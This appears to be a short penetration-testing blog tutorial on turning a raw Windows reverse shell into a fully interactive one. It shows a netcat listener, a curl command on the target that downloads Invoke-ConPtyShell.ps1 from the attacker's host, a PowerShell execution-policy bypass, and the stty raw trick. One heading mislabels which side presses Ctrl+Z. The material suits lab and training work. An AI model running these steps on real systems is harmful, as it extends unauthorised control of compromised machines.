---
title: "Upgrade to Full Interactive Shell in Windows"
date: 2026-11-05 18:21:00 +0700
categories: [Windows, Offensive Security]
tags: [windows, reverse-shell, interactive-shell, tty, conpty]
---
## Problem
Assume that we have an initial shell by exploiting a web vulnerability, for example: file upload, command injection or insecure deserialization, etc:
```
└─$ nc -nvlp 9001              
listening on [any] 9001 ...
connect to [10.10.15.107] from (UNKNOWN) [10.129.230.183] 49762

PS C:\windows\system32\inetsrv>
```
If you have ever met an intial shell like this, you will know the disadvantages of it. *A raw reverse shell on Windows is a dumb shell — it has no TTY, no job control, and no line editing. Ctrl+C kills the shell instead of interrupting the running process, interactive tools like vim, ssh, or python REPL either hang or refuse to start, and even the prompt can render incorrectly. In short: you can run one-off commands, but you can't work in it. That's exactly why upgrading to a full interactive shell matters.*

## Solution
First of all, **on the attacking host**, we need to run this command:
```
└─$ stty size         
39 189
```
Why `stty size` first?
Before upgrading the shell, we need to tell the Windows side how big our terminal is. `stty size` prints the current terminal dimensions in the form `<rows> <cols>` like above.<br>

Next, we must find a way to upload [Invoke-ConPtyShell.ps1](https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1) to the target.<br>
```
PS C:\users\sfitz> curl -o Invoke-ConPtyShell.ps1 http://10.10.15.107:8000/Invoke-ConPtyShell.ps1
```
After successfully uploading, **on the target** we need to import it. But we must change the policy  of powershell a little bit like this:
```
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser
```
```
Import-Module .\Invoke-ConPtyShell.ps1
```
When everything is okey, we will run below command. Remember to set a suitable value for `-Rows` and `-Cols` which we have found from `stty size`
```
PS C:\users\sfitz> Invoke-ConPtyShell -Upgrade -Rows 39 -Cols 189
```

Have not done yet :D.<br>

**On the target**, press `Ctrl + Z`. Then run below command directly in the terminal we are working on:
```
stty raw -echo; fg
```
Now we actually have a fully interactive shell !!<br>

But we need to explain the purpose of two above actions a little bit, right :D<br>
**1. On the target — Ctrl+Z**

This suspends the current foreground process (the raw reverse shell) and returns control to our local terminal. The remote shell is now paused in the background, waiting to be resumed.

**2. On the attacker — stty raw -echo; fg**

Now, on our local machine, we change how our own terminal behaves before bringing the shell back:

**stty raw**: Puts our local terminal into raw mode. In this mode, special key combinations like Ctrl+C (SIGINT) and Ctrl+Z (SIGTSTP) are no longer intercepted and handled by our local terminal driver. Instead, every keystroke is passed through directly to the remote process.

**-echo**: Disables local echo, so characters we type aren't displayed twice.

**fg**: Brings the suspended remote shell back to the foreground, now running on top of the raw-mode terminal.

